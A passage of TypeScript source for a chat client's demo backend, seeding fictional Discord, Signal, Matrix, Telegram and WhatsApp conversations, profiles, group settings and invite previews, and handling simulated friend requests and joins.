    fact: { nativeId: snow('dm-kitwork-main'), shape: 'direct', participants: [D.zyan.nativeId, KIT.work.nativeId] },
    msgs: [
      [3 * DAY + 200, KIT.work, 'unrelated, but can you review my sync PR when you get a sec'],
      [3 * DAY + 150, D.zyan, 'yep, tomorrow morning'],
      [120, KIT.work, 'PR is green now, merge whenever'],
    ],
    unread: 1,
  },
  {
    acc: ['dalt'],
    fact: { nativeId: snow('dm-kit-alt'), shape: 'direct', participants: [D.zyn.nativeId, KIT.exe.nativeId] },
    msgs: [
      [2 * DAY + 400, KIT.exe, 'cabin: fri to sun, $60 each. you in?'],
      [2 * DAY + 390, D.zyn, 'this is my alt 😅 but yes, count me in'],
      [2 * DAY + 385, KIT.exe, 'lol both your accounts are called zyan something, how am I supposed to know'],
      [20, KIT.exe, 'sent the map on matrix, did it arrive?'],
    ],
    unread: 1,
  },
  {
    acc: ['dalt'],
    fact: { nativeId: snow('dm-kitalt-alt'), shape: 'direct', participants: [D.zyn.nativeId, KIT.alt.nativeId] },
    msgs: [
      [2 * DAY + 380, KIT.alt, 'raid alt checking in: are you healing saturday?'],
      [2 * DAY + 370, D.zyn, 'yes, 8pm'],
    ],
  },
  {
    acc: ['sig'],
    fact: sdm(KIT.sig),
    msgs: [
      [2 * DAY + 100, KIT.sig, 'moving cabin stuff to signal, discord keeps eating my messages'],
      [2 * DAY + 95, S.self, '👍'],
      [2 * DAY + 90, KIT.sig, 'carpool from mine at 4pm friday?'],
      [300, KIT.sig, 'bring the speaker'],
      [250, KIT.sig, 'and snacks, ravi is bringing nothing as usual'],
    ],
    unread: 2,
  },
  {
    acc: ['mx'],
    fact: { nativeId: room('dm-kit', 'matrix.org'), shape: 'direct', participants: [M.self.nativeId, KIT.mx.nativeId], encrypted: true },
    msgs: [
      [3 * DAY + 120, KIT.mx, 'the PR, for when you look: https://github.com/libdither/dither-chat/pull/418'],
      [3 * DAY + 60, M.self, 'left two comments'],
      [60, KIT.mx, 'cabin map, the parking is the bit circled in red: https://maps.example.org/cabin-lake'],
    ],
    unread: 1,
  },
  {
    acc: ['mx'],
    fact: { nativeId: room('dm-kit-nix', 'nixos.dev'), shape: 'direct', participants: [M.self.nativeId, KIT.nix.nativeId], encrypted: true },
    msgs: [
      [DAY + 500, KIT.nix, 'btw the flake for the cabin wifi thing: https://github.com/kit/cabin-router'],
      [DAY + 480, M.self, 'of course you put nixos on the cabin router'],
    ],
  },
  {
    acc: ['tg'],
    fact: { nativeId: `user:${KIT.tg.nativeId}`, shape: 'direct', participants: [TG.self.nativeId, KIT.tg.nativeId] },
    msgs: [
      [DAY + 300, KIT.tg, 'made a telegram for the film photo group, adding you'],
      [DAY + 290, TG.self, 'app number five'],
    ],
  },
];
/** Mo's two Discord accounts, both talking with your main one: a chat whose routes differ in their account alone. */
const MO_CONVS: DemoConv[] = [
  {
    acc: ['dmain'],
    fact: { nativeId: snow('dm-mo-main'), shape: 'direct', participants: [D.zyan.nativeId, MO.main.nativeId] },
    msgs: [
      [2 * DAY + 200, MO.main, 'can you look at the sprite sheet tonight?'],
      [2 * DAY + 190, D.zyan, 'sure, send it over'],
      [45, MO.main, 'sending it from my art account, it has the files'],
    ],
  },
  {
    acc: ['dmain'],
    fact: { nativeId: snow('dm-moart-main'), shape: 'direct', participants: [D.zyan.nativeId, MO.art.nativeId] },
    msgs: [
      [40, MO.art, 'here, the walk cycle is frames 4 to 9'],
      [38, MO.art, 'the run cycle still needs work'],
    ],
    unread: 2,
  },
];
if (MULTI_ACCOUNT) CONVS.push(...KIT_CONVS, ...MO_CONVS);

// ------------------------------------------------------------------ live behaviour

/** Background chatter so the review instance stays alive. One line every ~1.5-3 minutes. */
const CHATTER: [AccKey, string, P.IdentityFact, string][] = [
  ['dmain', ch('rust-beginners'), D.tim, 'does `cargo fmt` pick up a rustfmt.toml in a workspace subdir?'],
  ['dalt', ch('hk-general'), D.gorb, 'pantheon 5 races sunday, sign up in the sheet'],
  ['mx', room('nixos-main', 'nixos.org'), M.lina, 'reminder: 26.11 branch-off is next week'],
  ['sig', sgroup('climb', '', []).nativeId, S.theo, 'thursday 7pm still good for everyone?'],
  ['dmain', ch('dither-dev'), D.ci, '✅ `main` · build #484 passed'],
  ['mx', room('rust-mx', 'matrix.org'), M.mira, 'the new borrow checker diagnostics are so much better'],
  ['dmain', ch('dither-general'), D.pixelfox, `${at(D.zyan)} the routing notes were super helpful, thanks!`],
  ['mx', room('house', 'matrix.org'), M.ben, "I'll be home tomorrow morning for the internet guy"],
  ['dmain', ch('rust-offtopic'), D.owl, 'what is everyone listening to while coding'],
  ['sig', sgroup('family', '', []).nativeId, S.mom, 'Mei is bringing dessert! 🍰'],
  ['wa', wgroup('books'), W.ines, 'I am only on chapter 3, no spoilers 🙈'],
  ['dalt', ch('hk-routes'), D.shade, 'found an even faster skip, video soon'],
  ['mx', room('nix-dev', 'nixos.org'), M.kai, 'anyone benchmarked the new evaluator on darwin?'],
];

const REPLIES: Record<string, string[]> = {
  [S.alice.nativeId]: ['haha ok', 'sounds good!', 'omw', '👍', 'you are the best'],
  [D.alice.nativeId]: ['lol', 'ok ok', 'sending it on signal'],
  [KIT.exe.nativeId]: ['wait which account is this', 'ok cool', 'lol'],
  [KIT.sig.nativeId]: ['perfect', 'see you friday', '🚗'],
  [KIT.work.nativeId]: ['thanks!', 'merging'],
  [MO.main.nativeId]: ['ok!', 'let me check'],
  [MO.art.nativeId]: ['nice', 'I will fix the run cycle'],
  [M.alice.nativeId]: ['let me know what you think of section 3'],
  [S.mom.nativeId]: ['Ok sweetie', 'Love you! See you Sunday', '❤️'],
  [W.nana.nativeId]: ['❤️', 'Good. Eat vegetables too'],
  [S.theo.nativeId]: ["I'll leave it at the gym desk"],
  [D.ravi.nativeId]: ['bet', 'ok see you at 8', 'healer secured'],
  [D.jordan.nativeId]: ['gl on the run!', 'lmk your time'],
  [M.kai.nativeId]: ['nice, I owe you one', 'ahh that makes sense'],
};

// ------------------------------------------------------------------ about and settings (docs/group-settings.md)

/**
 * Where each demo account stands, so the panel can show both sides: an owner who may change everything, a member
 * who may change nothing and is told why, and the networks' own in-between rules.
 */
const ADMIN_IN: Record<AccKey, string[]> = {
  dmain: [g.dither, ...['dither-general', 'dither-ann', 'dither-dev', 'dither-routing', 'dither-hangout'].map(ch), T.ditherBoot],
  dalt: [],
  sig: [sgroup('climb', '', []).nativeId, sgroup('dithercore', '', []).nativeId],
  mx: [room('house', 'matrix.org')],
  wa: [wgroup('books')],
  tg: [],
};
/** Matrix: your power level where it is not 100 or 0. */
const MX_LEVEL: Record<string, number> = { [room('libdither-mx', 'matrix.org')]: 50 };
/** Settings that differ from each network's defaults. */
const DEMO_VALUES: Record<string, Partial<P.AboutValues>> = {
  [ch('dither-dev')]: { slowMode: 0 },
  [ch('rust-offtopic')]: { slowMode: 10 },
  [ch('hk-general')]: { slowMode: 5 },
  [sgroup('climb', '', []).nativeId]: { disappearing: 7 * 86_400, editInfo: 'everyone' },
  [sgroup('family', '', []).nativeId]: { editInfo: 'admins', addMembers: 'admins' },
  [sgroup('dithercore', '', []).nativeId]: { editInfo: 'admins', addMembers: 'admins', disappearing: 28 * 86_400 },
  [wgroup('books')]: { disappearing: 7 * 86_400 },
  [wgroup('nbh-swap')]: { editInfo: 'everyone' },
  [wgroup('nbh-ann')]: { announceOnly: true, editInfo: 'admins' },
  [room('nixos-main', 'nixos.org')]: { joinRule: 'open', history: 'world_readable' },
  [room('nixos-help', 'nixos.org')]: { joinRule: 'open', history: 'world_readable' },
  [room('libdither-mx', 'matrix.org')]: { joinRule: 'ask', history: 'shared' },
};
const DEMO_PINS: Record<string, string[]> = {
  [ch('dither-general')]: [`${ch('dither-general')}~1`],
  [ch('rust-beginners')]: [`${ch('rust-beginners')}~4`, `${ch('rust-beginners')}~1`],
  [room('house', 'matrix.org')]: [],
};
const DISCORD_ROLES: Record<string, P.AboutRole[]> = {
  [g.dither]: [
    { id: snow('role-maint'), name: 'Maintainer', color: '#F2A541', rank: 100 },
    { id: snow('role-contrib'), name: 'Contributor', color: '#7FD1AE', rank: 50 },
    { id: g.dither, name: '@everyone', rank: 0 },
  ],
  [g.rust]: [
    { id: snow('role-mod'), name: 'Moderator', color: '#E86A92', rank: 100 },
    { id: snow('role-helper'), name: 'Helper', color: '#5C7CFA', rank: 50 },
    { id: g.rust, name: '@everyone', rank: 0 },
  ],
  [g.hk]: [{ id: g.hk, name: '@everyone', rank: 0 }],
};
const DISCORD_STAFF: Record<string, string> = {
  [D.zyan.nativeId]: 'role-maint',
  [D.quinn.nativeId]: 'role-maint',
  [D.lev.nativeId]: 'role-contrib',
  [D.mara.nativeId]: 'role-mod',
  [D.hannah.nativeId]: 'role-helper',
};

/** A demo place's settings, changed in memory by `configure` until the hub restarts or the demo world is made again. */
interface DemoPlace {
  values: Partial<P.AboutValues>;
  pinned: string[];
  invite: string | null;
}
const demoPlaces = new Map<string, DemoPlace>();
/** The facts as the world starts: `configure` replaces a renamed place's, and a new world puts them back. */
const FIRST_CONVS = new Map(CONVS.map((c) => [c, c.fact]));
const FIRST_SPACES = new Map(SPACES.map((x) => [x, x.fact]));

const lc = (s: string) => s[0].toUpperCase() + s.slice(1);
const ADDS_MEMBERS = new Set<P.Network>(['discord', 'signal', 'matrix']);
/** Making groups (docs/group-settings.md "Making a group"): not WhatsApp, which leaves it out on purpose. */
const MAKES_GROUPS = new Set<P.Network>(['discord', 'signal', 'matrix', 'telegram']);
/** Telegram's privacy refusal when making a group: Noor lets nobody add her to groups. */
const TG_PRIVATE = TG.noor.nativeId;
const NETWORK_META_NAME: Record<P.Network, string> = Object.fromEntries(Object.entries(NETWORK_META).map(([k, m]) => [k, m.name])) as Record<P.Network, string>;

const running = new Map<AccKey, DemoAdapter>();
let chatterTimer: Timer | undefined;
let chatterIdx = 0;

function scheduleChatter() {
  // Benchmarks (scripts/verify-perf.ts) count renders, which a stray message would change.
  if (chatterTimer || process.env.DITHER_DEMO_CHATTER === '0') return;
  const tick = () => {
    const line = CHATTER[chatterIdx++ % CHATTER.length];
    running.get(line[0])?.typeThenSay(line[1], line[2], line[3]);
    chatterTimer = setTimeout(tick, 90_000 + Math.random() * 90_000);
  };
  chatterTimer = setTimeout(tick, 45_000);
}

// ------------------------------------------------------------------ profiles (docs/profile.md)

type GuildKey = keyof typeof g;
const DISCORD_PROFILES: Record<string, { bio?: string; pronouns?: string; status?: { text?: string; emoji?: string }; accent?: string; servers?: GuildKey[]; nick?: Partial<Record<GuildKey, string>>; roles?: Partial<Record<GuildKey, { name: string; color?: string }[]>>; friends?: string[]; links?: P.PersonAbout['links'] }> = {
  alice: {
    bio: 'climbing, film photography, and too many browser tabs.\nbelay partner wanted on weekends 🧗',
    pronouns: 'she/her',
    status: { text: 'at the crag', emoji: '🧗' },
    accent: '#C0504D',
    servers: ['dither', 'hk'],
    nick: { dither: 'alice (testing)' },
    roles: { dither: [{ name: 'Testers', color: '#3BA55C' }] },
    friends: ['ravi', 'jordan', 'theo'],
    links: [{ label: 'GitHub', value: 'alicechen', url: 'https://github.com/alicechen', verified: true }],
  },
  quinn: {
    bio: 'networking nerd. working on the handshake in libdither.',
    pronouns: 'they/them',
    accent: '#2F7D95',
    servers: ['dither', 'rust'],
    roles: { dither: [{ name: 'Core', color: '#E67E22' }, { name: 'Reviewers', color: '#9B59B6' }], rust: [{ name: 'Helper', color: '#1ABC9C' }] },
    friends: ['alice', 'theo'],
    links: [{ label: 'GitHub', value: 'quinn-dev', url: 'https://github.com/quinn-dev', verified: true }, { label: 'Website', value: 'quinn.example', url: 'https://quinn.example' }],
  },
  ravi: { bio: 'raid leader on tuesdays', accent: '#4B6CB7', servers: ['hk'], friends: ['alice'], status: { text: 'grinding', emoji: '⚔️' } },
  jordan: { pronouns: 'he/him', servers: ['hk'], friends: ['alice'] },
  theo: { bio: 'has your belay device', servers: ['dither'], friends: ['alice', 'quinn'] },
  lev: { bio: 'p2p, routing, coffee', servers: ['dither', 'rust'], roles: { dither: [{ name: 'Maintainer', color: '#E91E63' }] } },
  // Multi-account only (these accounts exist only there): each of someone's accounts says its own thing.
  kit: { bio: 'makes things, breaks things, fixes most of them', pronouns: 'they/them', friends: ['alice'] },
  kitWork: { bio: 'infra at a small co-op. work account, slow replies' },
  kitAlt: { bio: 'raid alt. tuesdays only' },
  mo: { bio: 'writes rust, mostly' },
  moArt: { bio: 'one drawing a day in november' },
};
const SIGNAL_ABOUT: Record<string, { text: string; emoji: string }> = {
  alice: { text: 'on the wall, back at 8', emoji: '🧗' },
  mom: { text: 'Call me!', emoji: '☎️' },
  sam: { text: 'Busy, text me', emoji: '📵' },
  kit: { text: 'out climbing, back sunday', emoji: '🧗' },
};
/** Bios the demo's own accounts set (setProfile), by `${network}:${native id}`, over the ones above. */
const OWN_BIO = new Map<string, string>();
const WHATSAPP_ABOUT: Record<string, string> = {
  alice: 'Available',
  nana: 'Grandchildren are the best ❤️',
  marco: 'Ciao!',
};

// ------------------------------------------------------------------ adding (docs/add.md)

/** Places the demo's invites and addresses lead to: what joining them brings. */
interface Joinable {
  preview: Omit<P.AddPreview, 'actions' | 'joined'> & { actions: P.AddAction[] };
  /** Facts a join emits: people, then the space and its sections, then conversations with a few messages. */
  people?: P.IdentityFact[];
  space?: P.SpaceFact;
  sections?: P.SpaceFact[];
  convs: { fact: P.ConversationFact; msgs: [minutesAgo: number, author: P.IdentityFact, body: string][] }[];
  /** A join here asks first (a knock, a join request): nothing is joined. */
  asks?: boolean;
  /** The network wants a check first: nothing is done. */
  check?: P.AddCheck;
}

const px = {
  ink: did('px-ink', 'inkwell', 'inkwell'),
  dot: did('px-dot', 'dotmatrix', 'dot matrix'),
};
const gp = { pixel: snow('g-pixel'), speed: snow('g-speed') };
/** The server the demo joins from an invite, which then asks for its rules and onboarding (demoservers.ts). */
export const DEMO_PIXEL_GUILD = gp.pixel;
const gdev = mid('@gamedev-bot:matrix.org', 'gamedev bot', { isBot: true });
const tgx = { film: tid('film-admin', 'filmswap_admin', 'Film Swap admin', false), news: tid('news', 'dithernews_bot', 'Dither News', false) };
const hoa = W.hoa;

/** Keyed by network, then by invite code, address or name. */
const JOINABLE: Partial<Record<P.Network, Record<string, Joinable>>> = {
  discord: {
    pixelart: {
      preview: { what: 'space', name: 'Pixel Art Club', nativeId: gp.pixel, description: 'Weekly challenges, palettes and critique. Be kind.', members: 5321, online: 802, inviter: D.pixelfox.nativeId, expires: 0, actions: ['join'] },
      people: [px.ink, px.dot],
      space: { nativeId: gp.pixel, kind: 'community', name: 'Pixel Art Club', topic: 'Weekly challenges, palettes and critique' },
      sections: [{ nativeId: cat('px-start'), kind: 'section', name: 'Start here', parents: [{ nativeId: gp.pixel, position: pos(0) }] }],
      convs: [
        {
          fact: { nativeId: ch('px-welcome'), shape: 'channel', name: 'welcome', spaces: [{ nativeId: cat('px-start'), position: pos(0) }] },
          msgs: [
            [600, px.ink, 'Welcome! This week\'s challenge: a 32x32 lighthouse, 8 colours max.'],
            [420, px.dot, 'pinned the palette in #resources'],
          ],
        },
        { fact: { nativeId: ch('px-general'), shape: 'channel', name: 'general', spaces: [{ nativeId: cat('px-start'), position: pos(1) }] }, msgs: [[90, px.dot, 'anyone tried dithering with only 4 colours? looks great on the lighthouse']] },
      ],
    },
    speedrun: {
      preview: { what: 'space', name: 'Speedrun Archive', nativeId: gp.speed, description: 'Runs, routes and VODs from every category.', members: 18240, online: 1310, actions: ['join'], notes: ['New members pass a captcha first'] },
      check: 'captcha',
      convs: [],
    },
  },
  matrix: {
    '#rust-gamedev:matrix.org': {
      preview: { what: 'room', name: 'Rust Gamedev', nativeId: room('rust-gamedev', 'matrix.org'), description: 'Games and engines in Rust: Bevy, macroquad, Fyrox.', members: 412, actions: ['join'] },
      people: [gdev],
      convs: [
        {
          fact: { nativeId: room('rust-gamedev', 'matrix.org'), shape: 'channel', name: 'Rust Gamedev', topic: 'Games and engines in Rust: Bevy, macroquad, Fyrox.' },
          msgs: [
            [300, gdev, 'This week in Rust gamedev #142 is out'],
            [40, M.ferrous, 'has anyone moved to the new bevy scheduler yet?'],
          ],
        },
      ],
    },
    '#private-lab:matrix.org': {
      preview: { what: 'room', name: 'Private Lab', nativeId: room('private-lab', 'matrix.org'), members: 9, actions: ['ask'], notes: ["Joining asks the room's admins first (a knock)"] },
      asks: true,
      convs: [],
    },
  },
  telegram: {
    FilmSwap2026x: {
      preview: { what: 'group', name: 'Film Photo Swap', nativeId: 'chat:4471023', description: 'Swap rolls, share scans, meet up for walks.', members: 86, inviter: TG.noor.nativeId, actions: ['join'] },
      people: [tgx.film],
      convs: [
        {
          fact: { nativeId: 'chat:4471023', shape: 'group', name: 'Film Photo Swap', participants: [TG.self.nativeId, TG.noor.nativeId, tgx.film.nativeId] },
          msgs: [
            [800, tgx.film, 'Swap table is at the cafe on Saturday, bring what you have'],
            [120, TG.noor, 'I have two rolls of Portra 400 to trade'],
          ],
        },
      ],
    },
    ClimbAsk2026: {
      preview: { what: 'group', name: 'Berlin Climbers', members: 241, actions: ['ask'], notes: ['The admins approve new members'] },
      asks: true,
      convs: [],
    },
    dithernews: {
      preview: { what: 'channel', name: 'Dither News', nativeId: 'channel:1990311', description: 'Releases and notes from the dither project.', members: 2380, actions: ['join'] },
      people: [tgx.news],
      convs: [
        {
          fact: { nativeId: 'channel:1990311', shape: 'channel', variant: 'announcement', name: 'Dither News' },
          msgs: [
            [2000, tgx.news, 'dither 0.4 is out: coordinate routing is on by default.'],
            [300, tgx.news, 'Notes from this week: the handshake got simpler.'],
          ],
        },
      ],
    },
  },
  whatsapp: {
    MapleGardenSwap26: {
      preview: { what: 'group', name: 'Maple St Garden Swap', nativeId: wgroup('garden'), description: 'Seeds, cuttings and surplus veg on Maple Street.', members: 34, inviter: hoa.nativeId, actions: ['join'] },
      convs: [
        {
          fact: { nativeId: wgroup('garden'), shape: 'group', name: 'Maple St Garden Swap', participants: [W.self.nativeId, hoa.nativeId], encrypted: true },
          msgs: [[200, hoa, 'Tomato seedlings by my gate, free to a good home 🍅']],
        },
      ],
    },
  },
  signal: {
    // Any signal.group link: signal-cli cannot preview one, so joining is the only way to learn its name.
    '*': {
      preview: { what: 'group', name: '', partial: true, actions: ['join'], notes: ["Signal shows a group link's name only once you join"] },
      convs: [
        {
          fact: { ...sgroup('boardgames', 'Board Game Night', [S.priya, S.sam]) },
          msgs: [[180, S.priya, 'Next one is Friday at mine. Bringing Wingspan!']],
        },
      ],
    },
  },
};

/** Places the demo accounts are in already, by what leads there. */
const ALREADY_IN: Partial<Record<P.Network, Record<string, { preview: P.AddPreview }>>> = {
  discord: { libdither: { preview: { what: 'space', name: 'libdither', nativeId: g.dither, description: 'Dither: a coordinate-routed p2p network', members: 1287, online: 214, inviter: D.lev.nativeId, joined: { space: g.dither }, actions: [], notes: ['You are in this server already'] } } },
  matrix: { '#nixos:nixos.org': { preview: { what: 'space', name: 'NixOS', nativeId: room('nixos', 'nixos.org'), description: 'The NixOS community space', members: 9120, joined: { space: room('nixos', 'nixos.org') }, actions: [], notes: ['You are in this space already'] } } },
  signal: { 'https://signal.group/#CjQKIDemoClimbingCrewLink': { preview: { what: 'group', name: 'Climbing crew', nativeId: sgroup('climb', '', []).nativeId, joined: { conversation: sgroup('climb', '', []).nativeId }, actions: [], notes: ['You are in this group already'] } } },
};

const EXPIRED = new Set(['oldparty', 'Expired2025xyz', 'OldSwapGroup2025']);

/** Networks whose demo accounts keep a list of who they stand with (capabilities 'relationships' and 'disconnect'). */
const LISTED = new Set<P.Network>(['discord', 'telegram']);
/** Signal's demo account: safety numbers, blocking and nicknames kept on the network (net-gaps), as its adapter does. */
const SIGNAL_PEOPLE: P.Capability[] = ['safetyNumbers', 'block', 'contactNotes'];
const DEMO_VERIFIED = new Set<string>();
const DEMO_USERNAME = new Map<string, { name: string; link: string }>();

/** How the demo accounts stand with people from the start, over the contacts in their pools. */
const DEMO_LINKS: Partial<Record<AccKey, Record<string, P.LinkRelationship>>> = {
  dmain: { [D.owl.nativeId]: 'blocked' },
  dalt: { [D.mara.nativeId]: 'requested' },
  tg: { [TG.spam.nativeId]: 'blocked' },
};

/** What Discord says when a request must be confirmed first. */
const CONFIRM_LINE = 'You must confirm the friend request to add this user.';

/**
 * The demo's side of Add: resolve, add and answer as an adapter would, and the requests it holds. What it joined and
 * answered is kept in its account dir, so a restart neither forgets nor repeats it.
 */
class DemoAdd {
  /** links: how the account stands with someone since the demo began, over DEMO_LINKS and the pool's contacts. */
  private state: { joined: string[]; answered: string[]; friends: string[]; requested?: string[]; blocked?: string[]; links?: Record<string, P.PersonRelationship> };
  /** How many of each command this account was sent, for verify scripts (action addLog): a kept preview is none. */
  readonly counts = { resolve: 0, add: 0, answer: 0, remove: 0 };
  constructor(
    private key: AccKey,
    private network: P.Network,
    private self: P.IdentityFact,
    private dir: string,
    private emit: (ev: P.AdapterEvent) => void,
  ) {
    const f = join(dir, 'added.json');
    this.state = existsSync(f) ? JSON.parse(readFileSync(f, 'utf8')) : { joined: [], answered: [], friends: [] };
  }

  private save() {
    writeFileSync(join(this.dir, 'added.json'), JSON.stringify(this.state));
  }

  /** After connect: what was joined before, then the requests still waiting and the account's list (identity facts first). */
  start(epoch: number) {
    for (const k of this.state.joined) this.emitPlace(k, Date.now());
    this.emit({ t: 'requests', requests: this.requests(epoch).filter((r) => !this.state.answered.includes(r.nativeId)) });
    if (LISTED.has(this.network)) this.emit({ t: 'relationships', list: this.list(epoch) });
  }

  /** The account's list: friends, requests sent and blocks on Discord; contacts and blocks on Telegram. */
  private list(epoch: number): P.RelationshipFact[] {
    const out = new Map<string, P.RelationshipFact>();
    const pool = Object.values(POOLS[this.network] ?? {}).filter((i) => i !== this.self && i !== D.zyan && i !== D.zyn);
    pool.forEach((i, n) => {
      const rel = this.current(i.nativeId);
      if (rel !== 'stranger' && rel !== 'requesting') out.set(i.nativeId, { identity: i.nativeId, relationship: rel, since: epoch - (40 + n * 23) * 86_400_000 });
    });
    for (const [who, rel] of Object.entries(this.state.links ?? {})) if (!out.has(who) && rel !== 'stranger' && rel !== 'requesting') out.set(who, { identity: who, relationship: rel });
    return [...out.values()];
  }

  /** How you stand with someone now: what happened here, else the demo world's start. */
  current(who: string): P.PersonRelationship {
    const known = Object.values(POOLS[this.network] ?? {}).find((i) => i.nativeId === who);
    return this.relationship(who) ?? (known?.contact ? (this.network === 'discord' ? 'friend' : 'contact') : 'stranger');
  }

  /** Now so, and the account's list says it (a relationship event). */
  private setLink(who: string, rel: P.PersonRelationship) {
    this.state.links = { ...this.state.links, [who]: rel };
    this.save();
    if (LISTED.has(this.network) && rel !== 'requesting') this.emit({ t: 'relationship', fact: { identity: who, relationship: rel, since: Date.now() } });
  }

  /** Ends how you stand with someone, as the `remove` command does: only when it is what the owner saw. */
  remove(who: string, rel: P.PersonRelationship): P.AddResult {
    if (this.current(who) !== rel) throw new Error('That changed; look again');
    if (rel === 'requesting' || rel === 'stranger') throw new Error('There is nothing to remove');
    this.state.friends = this.state.friends.filter((x) => x !== who);
    this.state.requested = this.state.requested?.filter((x) => x !== who);
    this.state.blocked = this.state.blocked?.filter((x) => x !== who);
    this.setLink(who, 'stranger');
    const known = Object.values(POOLS[this.network] ?? {}).find((i) => i.nativeId === who);
    if (known?.contact && (rel === 'friend' || rel === 'contact')) this.emit({ t: 'identity', identity: { ...known, contact: false } });
    return { identity: who, relationship: 'stranger' };
  }

  /** A verify script's way to a relationship no demo network has (following): action relate. */
  relate(who: string, rel: P.PersonRelationship) {
    this.setLink(who, rel);
  }

  /** How you stand with someone after what was asked and answered here, over what the demo world starts with. */
  relationship(who: string): P.PersonRelationship | undefined {
    const set = this.state.links?.[who];
    if (set && set !== 'stranger') return set;
    if (set === 'stranger') return this.asking(who) ? 'requesting' : 'stranger';
    if (this.state.blocked?.includes(who)) return 'blocked';
    if (this.state.friends.includes(who)) return this.network === 'discord' ? 'friend' : 'contact';
    if (this.asking(who)) return 'requesting';
    if (this.state.requested?.includes(who)) return 'requested';
    return DEMO_LINKS[this.key]?.[who];
  }

  private asking(who: string): boolean {
    return this.requests(Date.now()).some((r) => r.from === who && (r.kind === 'friend' || r.kind === 'follow') && !this.state.answered.includes(r.nativeId));
  }

  private requests(now: number): P.RequestFact[] {
    if (this.key === 'dmain') return [{ nativeId: `friend-${D.nova.nativeId}`, kind: 'friend', from: D.nova.nativeId, ts: now - 3 * 3_600_000, answers: ['accept', 'decline', 'block'] }];
    // Flagged by Discord: accepting them takes a confirm.
    if (this.key === 'dalt')
      return [
        { nativeId: `friend-${D.drops.nativeId}`, kind: 'friend', from: D.drops.nativeId, ts: now - 40 * 60_000, answers: ['accept', 'decline', 'block'], warning: 'Discord filed this request as possible spam' },
        { nativeId: `friend-${D.wren.nativeId}`, kind: 'friend', from: D.wren.nativeId, ts: now - 5 * 3_600_000, answers: ['accept', 'decline', 'block'], warning: 'Discord says you share no server or friend with them' },
      ];
    if (this.key === 'mx') return [{ nativeId: room('nix-hack', 'matrix.org'), kind: 'invite', from: M.jules.nativeId, target: { kind: 'conversation', nativeId: room('nix-hack', 'matrix.org'), name: 'Nix Hackathon 2026', members: 23 }, ts: now - 26 * 3_600_000, answers: ['accept', 'decline'] }];
    if (this.key === 'sig') return [{ nativeId: `msgreq-${S.jamie.nativeId}`, kind: 'message', from: S.jamie.nativeId, target: { kind: 'conversation', nativeId: sdm(S.jamie).nativeId }, ts: now - 95 * 60_000, answers: ['accept', 'decline', 'block'] }];
    return [];
  }

  private keyOf(ref: P.AddRef): string {
    return ref.kind === 'invite' ? ref.code : ref.kind === 'place' ? ref.address : ref.kind === 'name' ? ref.name : ref.handle;
  }

  private joinable(k: string): Joinable | undefined {
    const all = JOINABLE[this.network] ?? {};
    return all[k] ?? (this.network === 'signal' && k.startsWith('https://signal.group/#') && !ALREADY_IN.signal?.[k] ? all['*'] : undefined);
  }

  private emitPlace(k: string, now: number) {
    const j = this.joinable(k);
    if (!j) return;
    for (const p of j.people ?? []) this.emit({ t: 'identity', identity: p });
    if (j.space) this.emit({ t: 'space', space: j.space });
    for (const s of j.sections ?? []) this.emit({ t: 'space', space: s });
    for (const c of j.convs) {
      this.emit({ t: 'conversation', conversation: { ...c.fact, lastMessageAt: now - Math.min(...c.msgs.map((m) => m[0])) * 60_000 } });
      c.msgs.forEach(([min, author, body], i) => this.emit({ t: 'message', live: false, message: { nativeId: `${c.fact.nativeId}~add-${i}`, conversation: c.fact.nativeId, author: author.nativeId, ts: now - min * 60_000, body } }));
    }
  }

  /** People by what was typed: an id, a handle, a username, a phone number. A signal.me link is Mei's. */
  private person(handle: string): P.IdentityFact | undefined {
    if (this.network === 'signal' && handle.startsWith('https://signal.me/')) return S.mei;
    const pool = Object.values(POOLS[this.network] ?? {});
    const digits = (s: string) => s.replace(/\D/g, '');
    return pool.find((i) => i !== this.self && (i.nativeId === handle || i.handle === handle || i.handle === `@${handle}` || (handle.startsWith('+') && !!i.handle && digits(i.handle) === digits(handle)) || (this.network === 'signal' && /\.\d{2,9}$/.test(handle) && i.displayName?.toLowerCase() === handle.split('.')[0].toLowerCase())));
  }

  command(cmd: Extract<P.AdapterCommand, { t: 'resolve' | 'add' | 'answer' | 'remove' }>): unknown {
    this.counts[cmd.t]++;
    const now = Date.now();
    if (cmd.t === 'remove') return this.remove(cmd.identity, cmd.relationship);
    if (cmd.t === 'answer') return this.answer(cmd.request, cmd.answer, now, cmd.confirm === true);
    const ref = cmd.ref;
    const k = this.keyOf(ref);
    if (ref.kind === 'invite' && EXPIRED.has(k)) throw new Error('This invite has expired or was revoked');
    const inAlready = ALREADY_IN[this.network]?.[k];
    const j = this.joinable(k);
    if (cmd.t === 'resolve') {
      if (inAlready) return inAlready.preview;
      if (j) {
        const joined = this.state.joined.includes(k);
        const first = j.convs[0]?.fact.nativeId;
        const p = { ...j.preview, ...(j.preview.partial ? { name: ref.kind === 'invite' ? ref.url : k } : {}), ...(j.preview.expires === 0 ? { expires: now + 6 * 86_400_000 } : {}) };
        return joined ? { ...p, partial: undefined, name: j.space?.name ?? j.convs[0]?.fact.name ?? p.name, joined: j.space ? { space: j.space.nativeId } : { conversation: first }, actions: [], notes: ['You are in it already'] } : p;
      }
      return this.resolvePerson(ref);
    }
    if (inAlready) return { ...(inAlready.preview.joined ?? {}) };
    if (j) {
      if (j.check) return { check: j.check };
      if (j.asks) return { pending: true, notes: ['Asked; the admins decide'] };
      if (!this.state.joined.includes(k)) {
        this.state.joined.push(k);
        this.save();
        this.emitPlace(k, now);
      }
      return { ...(j.space ? { space: j.space.nativeId } : {}), conversation: j.convs[0]?.fact.nativeId, ...(this.network === 'telegram' && j.preview.what === 'channel' ? { notes: ['Joined; only its admins post here'] } : {}) };
    }
    return this.addPerson(ref, cmd.action, cmd.confirm === true);
  }

  private resolvePerson(ref: P.AddRef): P.AddPreview {
    const net = NETWORK_META_NAME[this.network];
    if (ref.kind === 'invite') throw new Error(`${net} does not know this invite: it may have expired or been revoked`);
    if (ref.kind === 'place') throw new Error(`Matrix has no room called ${ref.address}`);
    const handle = ref.kind === 'name' ? ref.name : ref.handle;
    // Discord says who a username is only once the friend request is sent.
    if (this.network === 'discord' && !/^\d{15,22}$/.test(handle)) return { what: 'person', name: handle, partial: true, actions: ['friend'], notes: ['Discord says who this is only once the friend request is sent'] };
    const known = this.person(handle);
    if (!known) {
      if (this.network === 'telegram') throw new Error(`Nobody on Telegram is called @${handle}`);
      if (this.network === 'discord') throw new Error('Discord does not know that user');
      if (this.network === 'whatsapp' && handle.replace(/\D/g, '').startsWith('1555000')) throw new Error(`${handle} is not on WhatsApp`);
